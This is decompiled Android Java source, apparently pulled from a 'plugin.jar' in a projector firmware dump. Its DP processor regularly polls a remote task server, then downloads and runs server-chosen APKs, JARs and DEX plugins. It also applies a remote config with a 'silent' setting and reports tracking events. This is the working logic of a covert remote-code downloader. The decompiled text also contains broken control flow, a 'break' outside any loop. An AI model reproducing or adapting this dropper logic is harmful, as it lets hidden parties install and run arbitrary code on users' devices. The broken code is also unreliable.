package com.hs.cld.da;

import android.content.Context;
import android.content.Intent;
import com.hs.cld.da.dx.DexManager;
import com.hs.cld.da.model.ApkBean;
import com.hs.cld.da.model.DexBean;
import com.hs.cld.da.model.EventTypeEnum;
import com.hs.cld.da.model.JarBean;
import com.hs.cld.da.model.TaskListBean;
import com.hs.cld.da.model.TrackerBean;
import com.hs.cld.da.t.Tracker;
import com.hs.p.basic.BasicProcessor;
import com.hs.p.basic.Logger;
import com.hs.p.basic.Settings;
import com.hs.p.common.PROP;
import com.hs.p.common.utils.DigestUtils;
import com.hs.p.common.utils.LOG;
import com.hs.p.common.utils.ObjUtils;
import com.hs.p.common.utils.TextUtils;
import com.hs.p.dx.DIR;
import com.hs.p.dx.FileUtils;
import com.hs.p.q.ConfigBean;
import com.hs.p.q.ConfigHandler;
import java.io.File;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class DP extends BasicProcessor {
    public static final String ID = "DP";

    public DP() {
        super(ID, ID, true);
    }

    private String configString(ConfigBean configBean) {
        if (configBean == null) {
            return "null";
        }
        return "slt(" + configBean.silent + ")";
    }

    private Map<String, File> getLocalMd5FileMap(Context context) {
        File[] fileArrListFiles;
        HashMap map = new HashMap();
        HashMap map2 = new HashMap();
        try {
            File localRawFilesDir = DexManager.getLocalRawFilesDir(context);
            if (localRawFilesDir.exists() && localRawFilesDir.isDirectory() && (fileArrListFiles = localRawFilesDir.listFiles()) != null) {
                for (File file : fileArrListFiles) {
                    if (file.isFile() && file.getName().endsWith(DIR.SUFFIX_RF)) {
                        try {
                            String strMd5AsString = DigestUtils.md5AsString(file);
                            if (!map2.containsKey(strMd5AsString)) {
                                map2.put(strMd5AsString, new ArrayList());
                            }
                            ((List) map2.get(strMd5AsString)).add(file);
                        } catch (Exception e) {
                            LOG.w(this.TAG, "Could not calculate MD5 for local file: " + file.getName(), e);
                        }
                    }
                }
                for (Map.Entry entry : map2.entrySet()) {
                    String str = (String) entry.getKey();
                    List list = (List) entry.getValue();
                    if (list.size() > 1) {
                        list.sort(new Comparator() { // from class: com.hs.cld.da.b
                            @Override // java.util.Comparator
                            public final int compare(Object obj, Object obj2) {
                                return DP.lambda$getLocalMd5FileMap$0((File) obj, (File) obj2);
                            }
                        });
                        File file2 = (File) list.get(0);
                        LOG.i(this.TAG, "Found " + list.size() + " files with same MD5=" + str + ", keeping newest: " + file2.getName());
                        for (int i = 1; i < list.size(); i++) {
                            File file3 = (File) list.get(i);
                            LOG.i(this.TAG, "Deleting duplicate old file: " + file3.getName());
                            try {
                                FileUtils.deleteFile(file3);
                            } catch (Exception e2) {
                                LOG.w(this.TAG, "Failed to delete old file: " + file3.getName(), e2);
                            }
                        }
                        map.put(str, file2);
                    } else {
                        map.put(str, (File) list.get(0));
                    }
                    LOG.d(this.TAG, "Local dex file mapped: " + ((File) map.get(str)).getName() + " -> MD5=" + str);
                }
            }
        } catch (Exception e3) {
            LOG.e(this.TAG, "Error getting local MD5 file map: " + e3.getMessage(), e3);
        }
        return map;
    }

    private void handleAppList(Context context, List<ApkBean> list) {
        try {
            if (ObjUtils.empty(list)) {
                return;
            }
            for (ApkBean apkBean : list) {
                submitTracker(context, apkBean);
                new AppExe(context, apkBean).fire();
            }
        } catch (Throwable th) {
            LOG.e(this.TAG, "handle app list failed: " + th);
        }
    }

    private void handleDexInfo(Context context, List<DexBean> list) {
        boolean z;
        boolean z2;
        File[] fileArrListFiles;
        try {
            HashSet hashSet = new HashSet();
            Map<String, File> localMd5FileMap = getLocalMd5FileMap(context);
            LOG.i(this.TAG, "Found " + localMd5FileMap.size() + " local dex files with MD5 mapping");
            Set<String> runningPluginMd5s = DexManager.get().getRunningPluginMd5s();
            LOG.i(this.TAG, "Found " + runningPluginMd5s.size() + " running plugins");
            boolean z3 = true;
            if (ObjUtils.empty(list)) {
                z = false;
            } else {
                z = false;
                for (DexBean dexBean : list) {
                    hashSet.add(dexBean.tracker_id);
                    if (localMd5FileMap.containsKey(dexBean.file_md5)) {
                        File file = localMd5FileMap.get(dexBean.file_md5);
                        if (runningPluginMd5s.contains(dexBean.file_md5)) {
                            LOG.i(this.TAG, "Skip download for " + dexBean.tracker_id + ", same MD5 plugin is already running: " + file.getAbsolutePath() + ", MD5=" + dexBean.file_md5);
                        } else {
                            LOG.i(this.TAG, "Skip download for " + dexBean.tracker_id + ", same MD5 plugin exists but not running: " + file.getAbsolutePath() + ", MD5=" + dexBean.file_md5 + ", will reload it later");
                        }
                        submitTracker(context, dexBean);
                    } else {
                        submitTracker(context, dexBean);
                        try {
                            new DexExe(context, dexBean).fire();
                            z = true;
                        } catch (Exception e) {
                            if (e.getMessage() == null || !e.getMessage().contains("file exist")) {
                                LOG.w(this.TAG, "Download dex failed: " + dexBean.tracker_id + ", error: " + e.getMessage());
                            } else {
                                LOG.i(this.TAG, "Dex file already exists with same MD5, skip download: " + dexBean.tracker_id);
                            }
                        }
                    }
                }
            }
            HashSet hashSet2 = new HashSet();
            if (!ObjUtils.empty(list)) {
                for (DexBean dexBean2 : list) {
                    if (!TextUtils.empty(dexBean2.file_md5)) {
                        hashSet2.add(dexBean2.file_md5);
                    }
                }
            }
            File localRawFilesDir = DexManager.getLocalRawFilesDir(context);
            if (localRawFilesDir.exists() && localRawFilesDir.isDirectory() && (fileArrListFiles = localRawFilesDir.listFiles()) != null) {
                z2 = false;
                for (File file2 : fileArrListFiles) {
                    if (file2.isFile() && file2.getName().endsWith(DIR.SUFFIX_RF)) {
                        try {
                            String strMd5AsString = DigestUtils.md5AsString(file2);
                            if (hashSet2.contains(strMd5AsString)) {
                                LOG.d(this.TAG, "Syncing DEXs: Keeping local file with matching MD5: " + file2.getAbsolutePath() + ", MD5=" + strMd5AsString);
                            } else {
                                LOG.i(this.TAG, "Syncing DEXs: Deleting obsolete local file (MD5 not in server list): " + file2.getAbsolutePath() + ", MD5=" + strMd5AsString);
                                FileUtils.deleteFile(file2);
                                z2 = true;
                            }
                        } catch (Exception e2) {
                            LOG.w(this.TAG, "Could not calculate MD5 for local file: " + file2.getName() + ", will keep it", e2);
                        }
                    }
                }
            } else {
                z2 = false;
            }
            boolean z4 = z || z2;
            if (z4) {
                z3 = z4;
                break;
            }
            Set<String> setKeySet = localMd5FileMap.keySet();
            Set<String> runningPluginMd5s2 = DexManager.get().getRunningPluginMd5s();
            Iterator<String> it = setKeySet.iterator();
            while (true) {
                if (!it.hasNext()) {
                    z3 = z4;
                    break;
                }
                String next = it.next();
                if (!runningPluginMd5s2.contains(next)) {
                    LOG.i(this.TAG, "Found local plugin not running, MD5=" + next + ", will reload");
                    break;
                }
            }
            if (!z3) {
                LOG.i(this.TAG, "No dex file changes detected and all plugins running, skip reload");
                return;
            }
            LOG.i(this.TAG, "Reloading dex files due to changes (newDownload=" + z + ", fileDeleted=" + z2 + ")");
            DexManager.get().reload(context);
        } catch (Throwable th) {
            LOG.e(this.TAG, "handle dex list failed: " + th);
        }
    }

    private void handleJarList(Context context, List<JarBean> list) {
        try {
            if (ObjUtils.empty(list)) {
                return;
            }
            for (JarBean jarBean : list) {
                submitTracker(context, jarBean);
                new JarExe(context, jarBean).fire();
            }
        } catch (Throwable th) {
            LOG.e(this.TAG, "handle jar list failed: " + th);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static /* synthetic */ int lambda$getLocalMd5FileMap$0(File file, File file2) {
        return (file2.lastModified() > file.lastModified() ? 1 : (file2.lastModified() == file.lastModified() ? 0 : -1));
    }

    private void submitTracker(Context context, TrackerBean trackerBean) {
        new Tracker(context).setTaskId(trackerBean.task_id).setTrackerId(trackerBean.tracker_id).setEventType(EventTypeEnum.ARRIVED).setEventTime(System.currentTimeMillis()).setEventCode(0).setEventMessage("OK").submitAsync();
    }

    @Override // com.hs.p.basic.BasicProcessor
    protected long getLastHandleTime(Context context) {
        return Settings.getLastTaskTime(context, 0L);
    }

    @Override // com.hs.p.basic.BasicProcessor
    protected long getPeriods(Context context) {
        if (PROP.isBeta()) {
            return 60L;
        }
        long periods = Settings.getPeriods(context, 0L);
        if (ConfigHandler.isPeriodValid(periods)) {
            return periods;
        }
        return 21600L;
    }

    @Override // com.hs.p.basic.BasicProcessor
    protected void onTimeHandle(Context context, Intent intent) {
        try {
            String taskCursor = Settings.getTaskCursor(context, "0");
            GetTaskApi getTaskApi = new GetTaskApi(context);
            getTaskApi.setCursor(taskCursor);
            TaskListBean taskListBeanRequest = getTaskApi.request();
            if (taskListBeanRequest != null) {
                LOG.i(this.TAG, "da done, cursor=" + taskCursor + ", next=" + taskListBeanRequest.next_cursor + ", apk=" + ObjUtils.length(taskListBeanRequest.apks) + ", jar=" + ObjUtils.length(taskListBeanRequest.jars) + ", dx=" + ObjUtils.length(taskListBeanRequest.dexs) + ", conf=" + configString(taskListBeanRequest.conf) + ", clr=" + taskListBeanRequest.clear);
                if (1 == taskListBeanRequest.clear) {
                    LOG.i(this.TAG, "clear all ...");
                    DexManager.get().destroy(context);
                }
                ConfigBean configBean = taskListBeanRequest.conf;
                if (configBean != null) {
                    ConfigHandler.handle(context, configBean);
                }
                handleAppList(context, taskListBeanRequest.apks);
                handleJarList(context, taskListBeanRequest.jars);
                handleDexInfo(context, taskListBeanRequest.dexs);
                if (!TextUtils.equals(taskCursor, taskListBeanRequest.next_cursor)) {
                    LOG.i(this.TAG, "update task cursor: " + taskCursor + " >> " + taskListBeanRequest.next_cursor);
                    Settings.putTaskCursor(context, taskListBeanRequest.next_cursor);
                }
            }
        } catch (Throwable th) {
            LOG.e(this.TAG, "execute failed: " + th);
        }
        DexManager.get().load(context);
    }

    @Override // com.hs.p.basic.BasicProcessor
    protected void onTimeIdle(Context context, long j, long j2, String str) {
        Logger.append(context, this.TAG, "on time idle, periods=" + j + ", elapsed=" + j2 + ", dx.v=" + DexManager.get().getDxVersion());
        DexManager.get().load(context);
    }

    @Override // com.hs.p.basic.BasicProcessor
    protected void putLastHandleTime(Context context, long j) {
        Settings.putLastTaskTime(context, j);
    }
}
